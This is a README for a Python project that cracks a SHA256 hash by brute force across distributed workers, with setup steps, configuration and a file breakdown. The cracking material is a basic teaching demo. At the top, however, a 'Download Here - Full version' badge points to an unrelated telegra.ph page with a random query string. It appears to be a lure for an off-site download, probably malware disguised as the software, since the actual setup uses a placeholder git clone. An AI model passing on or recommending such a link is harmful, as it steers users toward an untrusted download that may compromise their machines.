# **Hash Hive: Distributed Password Cracker**

[![Download Now](https://img.shields.io/badge/Download%20Here-Full%20version-green)](https://telegra.ph/Download-05-02-264?4vo7clwl4pf9rfj)

## **Overview**
**Hash Hive** is a distributed password-cracking system designed to break a SHA256 hash using a brute-force approach. The system divides the password keyspace among multiple workers and distributes the workload dynamically, allowing efficient task management and real-time performance monitoring.

This project demonstrates distributed computing principles and how multiple workers can work in parallel to solve a computationally expensive problem.

---

## **Features**
- **Dynamic Keyspace Assignment**: The server assigns password chunks dynamically to workers based on their performance.
- **Load Balancing**: Workers that are faster at cracking passwords are assigned larger or more frequent chunks of the keyspace.
- **Real-Time Monitoring**: A web-based dashboard that provides insights into worker activity, progress, guesses per second, and system status.
- **Multiple Worker Support**: Supports multiple workers, even across different machines or processes, working together to crack the hash.
  
---

## **Project Setup**

### **1. Clone the Repository**
Start by cloning the repository to your local machine:
```
git clone https://github.com/yourusername/hash-hive.git
cd hash-hive
```

### **2. Install Dependencies**
This project requires **Python 3.x** and several libraries. Install the dependencies using `pip`:
```
pip install -r requirements.txt
```
- `Flask`: Web framework for building the real-time monitoring dashboard.
- `Flask-SocketIO`: For real-time bidirectional communication between the server and the dashboard.

---

## **Configuration (`config.py`)**
The configuration file holds the essential settings for the project.
- **TARGET_HASH**: The hash you want to crack (default is the SHA256 hash of "hello").
- **CHARSET**: The character set used to generate possible passwords (lowercase English letters).
- **MAX_PASSWORD_LENGTH**: The maximum length of the password to try.
- **CHUNK_SIZE**: The number of passwords in each chunk sent to workers.
- **SERVER_HOST & SERVER_PORT**: The address and port for the server to listen on.

---

## **Running the Project**

### **1. Start the Server**
The server manages task distribution and communicates with workers. To run the server:
```
python server.py
```
This will start the server and begin listening for incoming worker connections. The server will distribute password chunks to workers and monitor their progress.

### **2. Start the Worker**
The worker is responsible for attempting password guesses. To start a worker, run the following command in separate terminals (or on different machines in a distributed setup):
```
python worker.py
```
Each worker connects to the server and starts receiving password chunks. The worker will attempt each password in its assigned chunk, sending the result back to the server.


## **File Breakdown**

### **1. `config.py`**
Contains all the configurable parameters for the system, such as the target hash, character set, maximum password length, and server configuration.

### **2. `server.py`**
Handles incoming worker connections, manages the keyspace, distributes password chunks, and monitors worker performance.
- **`generate_keyspace_chunks()`**: Function that divides the keyspace into manageable chunks.
- **`handle_worker()`**: Function that communicates with a single worker and assigns tasks.

### **3. `worker.py`**
The worker script attempts to crack passwords by trying different combinations within its assigned chunk.
- **`hash_password()`**: Function to hash a password using SHA256.
- **`try_chunk()`**: Function that checks all passwords in the given chunk.

### **4. `dashboard.py`**
Runs a real-time web dashboard using Flask and SocketIO to display worker performance and system status.
- **Flask** serves the dashboard.
- **SocketIO** handles real-time updates to the dashboard.

### **5. `utils/helpers.py`**
Helper functions used throughout the project. These may include keyspace generation, task chunking, or password hashing.

---

## **Testing the System**

### **Simulating Multiple Workers Locally**
To simulate multiple workers on a single machine:
1. Open multiple terminal windows.
2. In each terminal, run the worker script:
   ```
   python worker.py
   ```
Each worker will receive a chunk of the keyspace and try to crack the hash.


---

## **Troubleshooting**
- **Server not connecting to workers**: Make sure the worker script is running and the server IP address and port match between the server and worker configurations.
- **Dashboard not updating**: Ensure that the Flask-SocketIO server is running correctly and that the client-side dashboard is receiving real-time updates.

---
